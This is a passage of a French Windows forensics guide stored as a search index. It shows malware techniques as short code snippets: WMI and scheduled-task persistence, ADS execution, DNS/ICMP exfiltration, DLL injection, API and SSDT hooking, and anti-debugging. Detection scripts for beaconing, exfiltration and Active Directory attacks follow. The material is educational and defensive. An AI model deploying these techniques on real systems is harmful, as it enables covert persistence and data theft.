version=\"1.0\" encoding=\"UTF-16\"?&gt;\n&lt;Task version=\"1.2\"&gt;\n  &lt;Triggers&gt;\n    &lt;LogonTrigger&gt;\n      &lt;Enabled&gt;true&lt;/Enabled&gt;\n    &lt;/LogonTrigger&gt;\n  &lt;/Triggers&gt;\n  &lt;Actions&gt;\n    &lt;Exec&gt;\n      &lt;Command&gt;C:\\Windows\\Temp\\malware.exe&lt;/Command&gt;\n    &lt;/Exec&gt;\n  &lt;/Actions&gt;\n&lt;/Task&gt;\n</code></pre></p>"},{"location":"malware-analysis/#wmi-event-consumers","title":"WMI Event Consumers","text":"<p>Persistance via WMI <pre><code># Event Filter\n$filterName = \"ProcessStartFilter\"\n$query = \"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'notepad.exe'\"\n$filterClass = ([wmiclass]\"\\\\.\\root\\subscription:__EventFilter\").CreateInstance()\n$filterClass.QueryLanguage = \"WQL\"\n$filterClass.Query = $query\n$filterClass.Name = $filterName\n$filterClass.Put()\n\n# Event Consumer\n$consumerName = \"MalwareConsumer\"\n$consumerClass = ([wmiclass]\"\\\\.\\root\\subscription:CommandLineEventConsumer\").CreateInstance()\n$consumerClass.Name = $consumerName\n$consumerClass.CommandLineTemplate = \"C:\\Windows\\Temp\\malware.exe\"\n$consumerClass.Put()\n\n# Binding\n$bindingClass = ([wmiclass]\"\\\\.\\root\\subscription:__FilterToConsumerBinding\").CreateInstance()\n$bindingClass.Filter = $filterClass\n$bindingClass.Consumer = $consumerClass\n$bindingClass.Put()\n</code></pre></p>"},{"location":"malware-analysis/#techniques-de-steganographie","title":"Techniques de steganographie","text":""},{"location":"malware-analysis/#steganographie-dans-les-fichiers","title":"Steganographie dans les fichiers","text":"<p>Images (LSB) <pre><code>from PIL import Image\n\ndef hide_data_in_image(image_path, data, output_path):\n    img = Image.open(image_path)\n    binary_data = ''.join(format(ord(char), '08b') for char in data)\n\n    pixels = list(img.getdata())\n    data_index = 0\n\n    for i in range(len(pixels)):\n        if data_index &lt; len(binary_data):\n            pixel = list(pixels[i])\n            # Modifier le LSB du canal rouge\n            pixel[0] = (pixel[0] &amp; 0xFE) | int(binary_data[data_index])\n            pixels[i] = tuple(pixel)\n            data_index += 1\n\n    img.putdata(pixels)\n    img.save(output_path)\n</code></pre></p> <p>Alternate Data Streams (ADS) <pre><code># Cr\u00e9ation d'ADS\necho \"malware code\" &gt; innocent.txt:hidden.exe\n\n# Ex\u00e9cution depuis ADS\nwmic process call create \"C:\\path\\innocent.txt:hidden.exe\"\n\n# D\u00e9tection ADS\ndir /r C:\\path\\\n</code></pre></p>"},{"location":"malware-analysis/#steganographie-reseau","title":"Steganographie r\u00e9seau","text":"<p>Covert channels <pre><code># DNS tunneling\nimport dns.resolver\n\ndef dns_exfiltrate(data, domain):\n    subdomain = data.encode('hex')\n    query = f\"{subdomain}.{domain}\"\n    dns.resolver.query(query, 'A')\n\n# ICMP tunneling\ndef icmp_tunnel(data):\n    packet = IP(dst=\"target.com\")/ICMP()/data\n    send(packet)\n</code></pre></p>"},{"location":"malware-analysis/#rootkits-et-bootkits","title":"Rootkits et bootkits","text":""},{"location":"malware-analysis/#rootkits-utilisateur","title":"Rootkits utilisateur","text":"<p>DLL Injection <pre><code>// Injection de DLL\nHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);\nLPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dll_path), MEM_COMMIT, PAGE_READWRITE);\nWriteProcessMemory(hProcess, pRemoteMemory, dll_path, strlen(dll_path), NULL);\n\nHANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, \n    (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteMemory, 0, NULL);\n</code></pre></p> <p>API Hooking <pre><code>// Hook de fonction\nBYTE original_bytes[5];\nDWORD old_protect;\n\n// Sauvegarder les bytes originaux\nReadProcessMemory(GetCurrentProcess(), target_function, original_bytes, 5, NULL);\n\n// Pr\u00e9parer le hook\nBYTE hook_bytes[5] = {0xE9}; // JMP instruction\nDWORD relative_address = (DWORD)hook_function - (DWORD)target_function - 5;\nmemcpy(hook_bytes + 1, &amp;relative_address, 4);\n\n// Installer le hook\nVirtualProtect(target_function, 5, PAGE_EXECUTE_READWRITE, &amp;old_protect);\nWriteProcessMemory(GetCurrentProcess(), target_function, hook_bytes, 5, NULL);\nVirtualProtect(target_function, 5, old_protect, &amp;old_protect);\n</code></pre></p>"},{"location":"malware-analysis/#rootkits-kernel","title":"Rootkits kernel","text":"<p>SSDT Hooking <pre><code>// Hook de la System Service Descriptor Table\nULONG old_NtCreateFile = KeServiceDescriptorTable.ServiceTableBase[0x52];\nKeServiceDescriptorTable.ServiceTableBase[0x52] = (ULONG)hooked_NtCreateFile;\n\nNTSTATUS hooked_NtCreateFile(/* parameters */) {\n    // Logique de hook\n    return original_NtCreateFile(/* parameters */);\n}\n</code></pre></p>"},{"location":"malware-analysis/#bootkits","title":"Bootkits","text":"<p>Master Boot Record (MBR) <pre><code>; Bootkit MBR\norg 0x7C00\n\n; Sauvegarder le MBR original\nmov si, 0x7C00\nmov di, 0x7E00\nmov cx, 0x200\nrep movsb\n\n; Installer le hook\n; ... code d'installation\n\n; Charger le syst\u00e8me d'exploitation\njmp 0x7E00\n</code></pre></p>"},{"location":"malware-analysis/#techniques-anti-forensiques","title":"Techniques anti-forensiques","text":""},{"location":"malware-analysis/#obfuscation","title":"Obfuscation","text":"<p>Packers <pre><code>- UPX: Compresseur standard\n- ASPack: Packer commercial\n- Themida: Protection avanc\u00e9e\n- VMProtect: Virtualisation de code\n</code></pre></p> <p>D\u00e9tection de packers <pre><code>import pefile\n\ndef detect_packer(pe_file):\n    pe = pefile.PE(pe_file)\n\n    # V\u00e9rifier l'entropie des sections\n    for section in pe.sections:\n        entropy = calculate_entropy(section.get_data())\n        if entropy &gt; 7.5:\n            return \"Possibly packed\"\n\n    # V\u00e9rifier les signatures\n    if b\"UPX\" in pe.__data__:\n        return \"UPX packed\"\n\n    return \"Not packed\"\n</code></pre></p>"},{"location":"malware-analysis/#anti-debugging","title":"Anti-debugging","text":"<p>Techniques de d\u00e9tection <pre><code>// IsDebuggerPresent\nif (IsDebuggerPresent()) {\n    ExitProcess(0);\n}\n\n// PEB check\nPPEB peb = (PPEB)__readgsqword(0x60);\nif (peb-&gt;BeingDebugged) {\n    ExitProcess(0);\n}\n\n// Timing check\nDWORD start = GetTickCount();\n// Code \u00e0 prot\u00e9ger\nDWORD end = GetTickCount();\nif (end - start &gt; threshold) {\n    ExitProcess(0);\n}\n</code></pre></p>"},{"location":"malware-analysis/#anti-vm","title":"Anti-VM","text":"<p>D\u00e9tection de virtualisation <pre><code>// VMware detection\nHKEY hKey;\nif (RegOpenKeyEx(HKEY_LOCAL_MACHINE, \"SOFTWARE\\\\VMware, Inc.\\\\VMware Tools\", 0, KEY_READ, &amp;hKey) == ERROR_SUCCESS) {\n    ExitProcess(0);\n}\n\n// CPU check\nint cpuinfo[4];\n__cpuid(cpuinfo, 1);\nif (cpuinfo[2] &amp; 0x80000000) { // Hypervisor present bit\n    ExitProcess(0);\n}\n</code></pre></p>"},{"location":"malware-analysis/#detection-et-analyse-des-techniques","title":"D\u00e9tection et analyse des techniques","text":""},{"location":"malware-analysis/#outils-de-detection","title":"Outils de d\u00e9tection","text":"<p>Volatility plugins <pre><code># D\u00e9tection de hooks\nvolatility -f memory.dump --profile=Win10x64 apihooks\n\n# D\u00e9tection de rootkits\nvolatility -f memory.dump --profile=Win10x64 ssdt\n\n# D\u00e9tection de processus cach\u00e9s\nvolatility -f memory.dump --profile=Win10x64 psxview\n</code></pre></p> <p>YARA rules pour rootkits <pre><code>rule Rootkit_Detection\n{\n    strings:\n        $api1 = \"ZwSetSystemInformation\"\n        $api2 = \"KeServiceDescriptorTable\"\n        $api3 = \"PsSetCreateProcessNotifyRoutine\"\n\n    condition:\n        any of them\n}\n</code></pre></p> <p>Cette approche m\u00e9thodique permet une analyse compl\u00e8te des malwares et de leurs techniques d'\u00e9vasion.</p>"},{"location":"network-analysis/","title":"Analyse R\u00e9seau pour la Forensique Windows","text":""},{"location":"network-analysis/#network-forensics-sur-windows-analyse-des-communications","title":"Network Forensics sur Windows - Analyse des communications","text":""},{"location":"network-analysis/#vue-densemble-de-lanalyse-reseau","title":"Vue d'ensemble de l'analyse r\u00e9seau","text":"<p>L'analyse r\u00e9seau forensique consiste \u00e0 capturer, analyser et interpr\u00e9ter le trafic r\u00e9seau pour identifier des activit\u00e9s malveillantes, reconstituer des \u00e9v\u00e9nements et collecter des preuves.</p>"},{"location":"network-analysis/#objectifs-de-lanalyse-reseau","title":"Objectifs de l'analyse r\u00e9seau","text":"<p>D\u00e9tection d'intrusion - Identification des connexions non autoris\u00e9es - D\u00e9tection d'exfiltration de donn\u00e9es - Analyse des communications de malwares</p> <p>Reconstruction d'\u00e9v\u00e9nements - Chronologie des communications - Identification des acteurs - Mapping des infrastructures malveillantes</p> <p>Collecte de preuves - Capture des communications - Extraction d'artefacts r\u00e9seau - Documentation des activit\u00e9s</p>"},{"location":"network-analysis/#capture-de-trafic-reseau","title":"Capture de trafic r\u00e9seau","text":""},{"location":"network-analysis/#outils-de-capture","title":"Outils de capture","text":"<p>Wireshark <pre><code># Capture sur interface sp\u00e9cifique\nwireshark -i eth0 -w capture.pcap\n\n# Capture avec filtre\nwireshark -i eth0 -f \"host 192.168.1.100\" -w targeted_capture.pcap\n\n# Capture en ligne de commande\ntshark -i eth0 -w network_traffic.pcap\n</code></pre></p> <p>tcpdump <pre><code># Capture basique\ntcpdump -i eth0 -w network.pcap\n\n# Capture avec filtres\ntcpdump -i eth0 host 192.168.1.100 and port 80 -w http_traffic.pcap\n\n# Capture DNS\ntcpdump -i eth0 port 53 -w dns_traffic.pcap\n\n# Capture avec timestamp\ntcpdump -i eth0 -tttt -w timestamped.pcap\n</code></pre></p> <p>netsh (Windows) <pre><code># D\u00e9marrer la capture\nnetsh trace start capture=yes tracefile=network.etl provider=Microsoft-Windows-TCPIP\n\n# Arr\u00eater la capture\nnetsh trace stop\n\n# Conversion en pcap\nnetsh trace convert network.etl output=network.pcap\n</code></pre></p>"},{"location":"network-analysis/#configuration-avancee","title":"Configuration avanc\u00e9e","text":"<p>Mirrors de ports <pre><code># Configuration switch Cisco\ninterface GigabitEthernet0/1\n switchport mode access\n switchport access vlan 100\n\nmonitor session 1 source interface GigabitEthernet0/1\nmonitor session 1 destination interface GigabitEthernet0/24\n</code></pre></p> <p>TAP r\u00e9seau <pre><code># Configuration avec ntopng\nntopng -i eth0 -P /var/lib/ntopng/ntopng.pid -d /var/lib/ntopng -w 3000\n</code></pre></p>"},{"location":"network-analysis/#analyse-des-connexions-tcpudp","title":"Analyse des connexions TCP/UDP","text":""},{"location":"network-analysis/#analyse-des-flux-tcp","title":"Analyse des flux TCP","text":"<p>Reconstruction des sessions <pre><code>import pyshark\n\ndef analyze_tcp_streams(pcap_file):\n    cap = pyshark.FileCapture(pcap_file)\n\n    tcp_streams = {}\n\n    for packet in cap:\n        if hasattr(packet, 'tcp'):\n            stream_id = packet.tcp.stream\n\n            if stream_id not in tcp_streams:\n                tcp_streams[stream_id] = {\n                    'packets': [],\n                    'src_ip': packet.ip.src,\n                    'dst_ip': packet.ip.dst,\n                    'src_port': packet.tcp.srcport,\n                    'dst_port': packet.tcp.dstport,\n                    'start_time': packet.sniff_time,\n                    'bytes_sent': 0,\n                    'bytes_received': 0\n                }\n\n            tcp_streams[stream_id]['packets'].append(packet)\n\n            # Calculer les statistiques\n            if hasattr(packet, 'tcp') and hasattr(packet.tcp, 'len'):\n                tcp_streams[stream_id]['bytes_sent'] += int(packet.tcp.len)\n\n    return tcp_streams\n</code></pre></p> <p>D\u00e9tection d'anomalies TCP <pre><code>def detect_tcp_anomalies(tcp_streams):\n    anomalies = []\n\n    for stream_id, stream in tcp_streams.items():\n        # Connexions sur ports non standard\n        if int(stream['dst_port']) not in [80, 443, 22, 21, 25, 110, 143]:\n            anomalies.append(f\"Stream {stream_id}: Non-standard port {stream['dst_port']}\")\n\n        # Ratio de donn\u00e9es suspect\n        if stream['bytes_sent'] &gt; 10000000:  # 10MB\n            anomalies.append(f\"Stream {stream_id}: Large data transfer\")\n\n        # Connexions longues\n        duration = (stream['packets'][-1].sniff_time - stream['start_time']).total_seconds()\n        if duration &gt; 3600:  # 1 heure\n            anomalies.append(f\"Stream {stream_id}: Long connection ({duration}s)\")\n\n    return anomalies\n</code></pre></p>"},{"location":"network-analysis/#analyse-udp","title":"Analyse UDP","text":"<p>Analyse des flux UDP <pre><code>def analyze_udp_traffic(pcap_file):\n    cap = pyshark.FileCapture(pcap_file)\n\n    udp_flows = {}\n\n    for packet in cap:\n        if hasattr(packet, 'udp'):\n            flow_key = f\"{packet.ip.src}:{packet.udp.srcport}-&gt;{packet.ip.dst}:{packet.udp.dstport}\"\n\n            if flow_key not in udp_flows:\n                udp_flows[flow_key] = {\n                    'packets': [],\n                    'total_bytes': 0,\n                    'start_time': packet.sniff_time,\n                    'last_time': packet.sniff_time\n                }\n\n            udp_flows[flow_key]['packets'].append(packet)\n            udp_flows[flow_key]['total_bytes'] += int(packet.udp.length)\n            udp_flows[flow_key]['last_time'] = packet.sniff_time\n\n    return udp_flows\n</code></pre></p> <p>D\u00e9tection de tunneling DNS <pre><code>def detect_dns_tunneling(pcap_file):\n    cap = pyshark.FileCapture(pcap_file)\n\n    dns_queries = {}\n\n    for packet in cap:\n        if hasattr(packet, 'dns') and packet.dns.flags_response == '0':\n            query_name = packet.dns.qry_name\n\n            if query_name not in dns_queries:\n                dns_queries[query_name] = []\n\n            dns_queries[query_name].append(packet)\n\n    # D\u00e9tection de tunneling\n    suspicious_domains = []\n    for domain, queries in dns_queries.items():\n        if len(queries) &gt; 100:  # Nombreuses requ\u00eates\n            suspicious_domains.append(domain)\n\n        # Sous-domaines longs (potentiel tunneling)\n        if len(domain.split('.')[0]) &gt; 50:\n            suspicious_domains.append(domain)\n\n    return suspicious_domains\n</code></pre></p>"},{"location":"network-analysis/#logs-reseau-windows","title":"Logs r\u00e9seau Windows","text":""},{"location":"network-analysis/#event-logs-reseau","title":"Event Logs r\u00e9seau","text":"<p>Security Event Log <pre><code># \u00c9v\u00e9nements de connexion r\u00e9seau\nGet-WinEvent -FilterHashtable @{LogName=\"Security\"; ID=5156} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $data = $event.Event.EventData.Data\n\n    Write-Host \"Source IP: $($data[0].'#text')\"\n    Write-Host \"Source Port: $($data[1].'#text')\"\n    Write-Host \"Destination IP: $($data[2].'#text')\"\n    Write-Host \"Destination Port: $($data[3].'#text')\"\n    Write-Host \"Protocol: $($data[4].'#text')\"\n    Write-Host \"---\"\n}\n</code></pre></p> <p>Firewall Logs <pre><code># Activation du logging firewall\nnetsh advfirewall set allprofiles logging filename %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\nnetsh advfirewall set allprofiles logging maxfilesize 4096\nnetsh advfirewall set allprofiles logging droppedconnections enable\nnetsh advfirewall set allprofiles logging allowedconnections enable\n\n# Analyse des logs\nGet-Content C:\\Windows\\system32\\LogFiles\\Firewall\\pfirewall.log | Where-Object {$_ -like \"*DROP*\"} | Select-Object -First 10\n</code></pre></p>"},{"location":"network-analysis/#sysmon-network-events","title":"Sysmon Network Events","text":"<p>Configuration Sysmon <pre><code>&lt;Sysmon schemaversion=\"4.30\"&gt;\n  &lt;EventFiltering&gt;\n    &lt;NetworkConnect onmatch=\"include\"&gt;\n      &lt;Image condition=\"end with\"&gt;cmd.exe&lt;/Image&gt;\n      &lt;Image condition=\"end with\"&gt;powershell.exe&lt;/Image&gt;\n      &lt;Image condition=\"end with\"&gt;rundll32.exe&lt;/Image&gt;\n    &lt;/NetworkConnect&gt;\n  &lt;/EventFiltering&gt;\n&lt;/Sysmon&gt;\n</code></pre></p> <p>Analyse des \u00e9v\u00e9nements Sysmon <pre><code># Connexions r\u00e9seau (Event ID 3)\nGet-WinEvent -FilterHashtable @{LogName=\"Microsoft-Windows-Sysmon/Operational\"; ID=3} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $processName = ($eventData | Where-Object {$_.Name -eq \"Image\"}).'#text'\n    $destIP = ($eventData | Where-Object {$_.Name -eq \"DestinationIp\"}).'#text'\n    $destPort = ($eventData | Where-Object {$_.Name -eq \"DestinationPort\"}).'#text'\n\n    Write-Host \"Process: $processName -&gt; $destIP:$destPort\"\n}\n</code></pre></p>"},{"location":"network-analysis/#detection-dactivites-malveillantes","title":"D\u00e9tection d'activit\u00e9s malveillantes","text":""},{"location":"network-analysis/#indicateurs-de-compromission-reseau","title":"Indicateurs de compromission r\u00e9seau","text":"<p>Beaconing <pre><code>def detect_beaconing(pcap_file):\n    cap = pyshark.FileCapture(pcap_file)\n\n    connections = {}\n\n    for packet in cap:\n        if hasattr(packet, 'ip') and hasattr(packet, 'tcp'):\n            key = f\"{packet.ip.src}-&gt;{packet.ip.dst}:{packet.tcp.dstport}\"\n\n            if key not in connections:\n                connections[key] = []\n\n            connections[key].append(packet.sniff_time)\n\n    # Analyser les intervalles\n    beacons = []\n    for conn, timestamps in connections.items():\n        if len(timestamps) &gt; 10:\n            intervals = []\n            for i in range(1, len(timestamps)):\n                interval = (timestamps[i] - timestamps[i-1]).total_seconds()\n                intervals.append(interval)\n\n            # V\u00e9rifier la r\u00e9gularit\u00e9\n            if len(intervals) &gt; 5:\n                avg_interval = sum(intervals) / len(intervals)\n                variance = sum((x - avg_interval) ** 2 for x in intervals) / len(intervals)\n\n                if variance &lt; 10:  # Faible variance = beaconing\n                    beacons.append({\n                        'connection': conn,\n                        'interval': avg_interval,\n                        'variance': variance,\n                        'count': len(timestamps)\n                    })\n\n    return beacons\n</code></pre></p> <p>Exfiltration de donn\u00e9es <pre><code>def detect_data_exfiltration(pcap_file):\n    cap = pyshark.FileCapture(pcap_file)\n\n    external_transfers = {}\n\n    for packet in cap:\n        if hasattr(packet, 'ip') and hasattr(packet, 'tcp'):\n            src_ip = packet.ip.src\n            dst_ip = packet.ip.dst\n\n            # V\u00e9rifier si destination externe\n            if not dst_ip.startswith('192.168.') and not dst_ip.startswith('10.'):\n                key = f\"{src_ip}-&gt;{dst_ip}\"\n\n                if key not in external_transfers:\n                    external_transfers[key] = 0\n\n                if hasattr(packet, 'tcp') and hasattr(packet.tcp, 'len'):\n                    external_transfers[key] += int(packet.tcp.len)\n\n    # Identifier les transferts suspects\n    suspicious_transfers = []\n    for transfer, bytes_sent in external_transfers.items():\n        if bytes_sent &gt; 10000000:  # 10MB\n            suspicious_transfers.append({\n                'transfer': transfer,\n                'bytes': bytes_sent,\n                'mb': bytes_sent / (1024 * 1024)\n            })\n\n    return suspicious_transfers\n</code></pre></p>"},{"location":"network-analysis/#analyse-des-protocoles","title":"Analyse des protocoles","text":"<p>HTTP Analysis <pre><code>def analyze_http_traffic(pcap_file):\n    cap = pyshark.FileCapture(pcap_file)\n\n    http_requests = []\n\n    for packet in cap:\n        if hasattr(packet, 'http'):\n            if hasattr(packet.http, 'request_method'):\n                request = {\n                    'timestamp': packet.sniff_time,\n                    'src_ip': packet.ip.src,\n                    'dst_ip': packet.ip.dst,\n                    'method': packet.http.request_method,\n                    'host': packet.http.host if hasattr(packet.http, 'host') else 'Unknown',\n                    'uri': packet.http.request_uri if hasattr(packet.http, 'request_uri') else 'Unknown',\n                    'user_agent': packet.http.user_agent if hasattr(packet.http, 'user_agent') else 'Unknown'\n                }\n\n                http_requests.append(request)\n\n    return http_requests\n</code></pre></p> <p>HTTPS Analysis <pre><code>def analyze_tls_traffic(pcap_file):\n    cap = pyshark.FileCapture(pcap_file)\n\n    tls_sessions = []\n\n    for packet in cap:\n        if hasattr(packet, 'tls'):\n            if hasattr(packet.tls, 'handshake_extensions_server_name'):\n                session = {\n                    'timestamp': packet.sniff_time,\n                    'src_ip': packet.ip.src,\n                    'dst_ip': packet.ip.dst,\n                    'server_name': packet.tls.handshake_extensions_server_name,\n                    'cipher_suite': packet.tls.handshake_ciphersuite if hasattr(packet.tls, 'handshake_ciphersuite') else 'Unknown'\n                }\n\n                tls_sessions.append(session)\n\n    return tls_sessions\n</code></pre></p>"},{"location":"network-analysis/#analyse-des-shares-et-rpc-communication-inter-processus","title":"Analyse des Shares et RPC - Communication inter-processus","text":""},{"location":"network-analysis/#smbcifs-forensics","title":"SMB/CIFS forensics","text":""},{"location":"network-analysis/#analyse-du-trafic-smb","title":"Analyse du trafic SMB","text":"<p>Capture SMB <pre><code># Capture du trafic SMB\ntshark -i eth0 -f \"port 445 or port 139\" -w smb_traffic.pcap\n\n# Analyse avec Wireshark\nwireshark -r smb_traffic.pcap -Y \"smb2\"\n</code></pre></p> <p>Extraction des fichiers SMB <pre><code>import pyshark\n\ndef extract_smb_files(pcap_file):\n    cap = pyshark.FileCapture(pcap_file)\n\n    smb_files = []\n\n    for packet in cap:\n        if hasattr(packet, 'smb2'):\n            if hasattr(packet.smb2, 'filename'):\n                file_info = {\n                    'timestamp': packet.sniff_time,\n                    'src_ip': packet.ip.src,\n                    'dst_ip': packet.ip.dst,\n                    'filename': packet.smb2.filename,\n                    'share': packet.smb2.tree if hasattr(packet.smb2, 'tree') else 'Unknown',\n                    'command': packet.smb2.cmd if hasattr(packet.smb2, 'cmd') else 'Unknown'\n                }\n\n                smb_files.append(file_info)\n\n    return smb_files\n</code></pre></p>"},{"location":"network-analysis/#analyse-des-evenements-smb","title":"Analyse des \u00e9v\u00e9nements SMB","text":"<p>Audit SMB <pre><code># Activation de l'audit SMB\nauditpol /set /subcategory:\"File Share\" /success:enable /failure:enable\nauditpol /set /subcategory:\"Detailed File Share\" /success:enable /failure:enable\n\n# Analyse des \u00e9v\u00e9nements\nGet-WinEvent -FilterHashtable @{LogName=\"Security\"; ID=5140} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $subject = ($eventData | Where-Object {$_.Name -eq \"SubjectUserName\"}).'#text'\n    $shareName = ($eventData | Where-Object {$_.Name -eq \"ShareName\"}).'#text'\n    $sourceIP = ($eventData | Where-Object {$_.Name -eq \"IpAddress\"}).'#text'\n\n    Write-Host \"User: $subject accessed share: $shareName from IP: $sourceIP\"\n}\n</code></pre></p>"},{"location":"network-analysis/#rpc-et-named-pipes","title":"RPC et named pipes","text":""},{"location":"network-analysis/#analyse-rpc","title":"Analyse RPC","text":"<p>Capture RPC <pre><code># Capture du trafic RPC\ntshark -i eth0 -f \"port 135\" -w rpc_traffic.pcap\n\n# Analyse avec Wireshark\nwireshark -r rpc_traffic.pcap -Y \"dcerpc\"\n</code></pre></p> <p>Analyse des named pipes <pre><code>def analyze_named_pipes(pcap_file):\n    cap = pyshark.FileCapture(pcap_file)\n\n    named_pipes = []\n\n    for packet in cap:\n        if hasattr(packet, 'smb2') and hasattr(packet.smb2, 'filename'):\n            filename = packet.smb2.filename\n\n            if filename.startswith('\\\\\\\\'):\n                pipe_info = {\n                    'timestamp': packet.sniff_time,\n                    'src_ip': packet.ip.src,\n                    'dst_ip': packet.ip.dst,\n                    'pipe_name': filename,\n                    'operation': packet.smb2.cmd if hasattr(packet.smb2, 'cmd') else 'Unknown'\n                }\n\n                named_pipes.append(pipe_info)\n\n    return named_pipes\n</code></pre></p>"},{"location":"network-analysis/#monitoring-des-named-pipes","title":"Monitoring des named pipes","text":"<p>PowerShell monitoring <pre><code># Monitoring des named pipes avec Sysmon\nGet-WinEvent -FilterHashtable @{LogName=\"Microsoft-Windows-Sysmon/Operational\"; ID=17,18} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $processName = ($eventData | Where-Object {$_.Name -eq \"Image\"}).'#text'\n    $pipeName = ($eventData | Where-Object {$_.Name -eq \"PipeName\"}).'#text'\n    $eventType = if ($_.Id -eq 17) { \"Created\" } else { \"Connected\" }\n\n    Write-Host \"Process: $processName $eventType pipe: $pipeName\"\n}\n</code></pre></p>"},{"location":"network-analysis/#analyse-des-connexions-distantes","title":"Analyse des connexions distantes","text":""},{"location":"network-analysis/#rdp-analysis","title":"RDP Analysis","text":"<p>Capture RDP <pre><code># Capture du trafic RDP\ntshark -i eth0 -f \"port 3389\" -w rdp_traffic.pcap\n\n# Analyse des connexions\ntshark -r rdp_traffic.pcap -Y \"rdp\"\n</code></pre></p> <p>Analyse des logs RDP <pre><code># \u00c9v\u00e9nements de connexion RDP\nGet-WinEvent -FilterHashtable @{LogName=\"Microsoft-Windows-TerminalServices-LocalSessionManager/Operational\"; ID=21,22,25} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $user = ($eventData | Where-Object {$_.Name -eq \"User\"}).'#text'\n    $sourceIP = ($eventData | Where-Object {$_.Name -eq \"Address\"}).'#text'\n    $sessionID = ($eventData | Where-Object {$_.Name -eq \"SessionID\"}).'#text'\n\n    $eventType = switch ($_.Id) {\n        21 { \"Logon Success\" }\n        22 { \"Shell Start\" }\n        25 { \"Reconnection\" }\n    }\n\n    Write-Host \"$eventType - User: $user from IP: $sourceIP (Session: $sessionID)\"\n}\n</code></pre></p>"},{"location":"network-analysis/#winrm-analysis","title":"WinRM Analysis","text":"<p>Analyse WinRM <pre><code># \u00c9v\u00e9nements WinRM\nGet-WinEvent -FilterHashtable @{LogName=\"Microsoft-Windows-WinRM/Operational\"} | Where-Object {$_.LevelDisplayName -eq \"Information\"} | ForEach-Object {\n    Write-Host \"Time: $($_.TimeCreated) - Message: $($_.Message)\"\n}\n\n# Analyse des connexions PowerShell remotes\nGet-WinEvent -FilterHashtable @{LogName=\"Microsoft-Windows-PowerShell/Operational\"; ID=4103} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    Write-Host \"PowerShell Remote Command: $($event.Event.EventData.Data.'#text')\"\n}\n</code></pre></p>"},{"location":"network-analysis/#detection-de-mouvements-lateraux","title":"D\u00e9tection de mouvements lat\u00e9raux","text":""},{"location":"network-analysis/#pass-the-hash-detection","title":"Pass-the-Hash Detection","text":"<p>Analyse des \u00e9v\u00e9nements d'authentification <pre><code># D\u00e9tection de Pass-the-Hash via Event ID 4624\nGet-WinEvent -FilterHashtable @{LogName=\"Security\"; ID=4624} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $logonType = ($eventData | Where-Object {$_.Name -eq \"LogonType\"}).'#text'\n    $authPackage = ($eventData | Where-Object {$_.Name -eq \"AuthenticationPackageName\"}).'#text'\n    $targetUser = ($eventData | Where-Object {$_.Name -eq \"TargetUserName\"}).'#text'\n    $sourceIP = ($eventData | Where-Object {$_.Name -eq \"IpAddress\"}).'#text'\n\n    # Logon type 3 (Network) avec NTLM peut indiquer Pass-the-Hash\n    if ($logonType -eq \"3\" -and $authPackage -eq \"NTLM\") {\n        Write-Host \"Potential Pass-the-Hash: User $targetUser from IP $sourceIP\"\n    }\n}\n</code></pre></p>"},{"location":"network-analysis/#golden-ticket-detection","title":"Golden Ticket Detection","text":"<p>Analyse Kerberos <pre><code># D\u00e9tection de Golden Ticket via Event ID 4769\nGet-WinEvent -FilterHashtable @{LogName=\"Security\"; ID=4769} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $ticketOptions = ($eventData | Where-Object {$_.Name -eq \"TicketOptions\"}).'#text'\n    $encryptionType = ($eventData | Where-Object {$_.Name -eq \"TicketEncryptionType\"}).'#text'\n    $accountName = ($eventData | Where-Object {$_.Name -eq \"TargetUserName\"}).'#text'\n\n    # Ticket options 0x40810000 peut indiquer Golden Ticket\n    if ($ticketOptions -eq \"0x40810000\") {\n        Write-Host \"Potential Golden Ticket: Account $accountName with encryption $encryptionType\"\n    }\n}\n</code></pre></p>"},{"location":"network-analysis/#detection-de-dcsync","title":"D\u00e9tection de DCSync","text":"<p>Analyse des r\u00e9plications AD <pre><code># D\u00e9tection de DCSync via Event ID 4662\nGet-WinEvent -FilterHashtable @{LogName=\"Security\"; ID=4662} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $objectName = ($eventData | Where-Object {$_.Name -eq \"ObjectName\"}).'#text'\n    $accessMask = ($eventData | Where-Object {$_.Name -eq \"AccessMask\"}).'#text'\n    $subjectUser = ($eventData | Where-Object {$_.Name -eq \"SubjectUserName\"}).'#text'\n\n    # Access mask 0x100 (DS-Replication-Get-Changes) peut indiquer DCSync\n    if ($accessMask -eq \"0x100\") {\n        Write-Host \"Potential DCSync: User $subjectUser accessing $objectName\"\n    }\n}\n</code></pre></p>"},{"location":"network-analysis/#outils-danalyse-reseau","title":"Outils d'analyse r\u00e9seau","text":""},{"location":"network-analysis/#wireshark-avance","title":"Wireshark avanc\u00e9","text":"<p>Filtres utiles <pre><code># Trafic suspect\ntcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size &lt;= 1024\n\n# Connexions longues\ntcp.time_delta &gt; 300\n\n# Transferts de donn\u00e9es importants\ntcp.len &gt; 1000\n\n# Trafic non standard\nnot (tcp.port == 80 or tcp.port == 443 or tcp.port == 53 or tcp.port == 22)\n</code></pre></p>"},{"location":"network-analysis/#zeek-bro","title":"Zeek (Bro)","text":"<p>Configuration Zeek <pre><code># local.zeek\n@load base/frameworks/notice\n@load base/protocols/conn\n@load base/protocols/http\n@load base/protocols/dns\n@load base/protocols/ssl\n\n# D\u00e9tection de beaconing\nevent connection_established(c: connection) {\n    local duration = c$duration;\n    local bytes = c$orig_bytes + c$resp_bytes;\n\n    if (duration 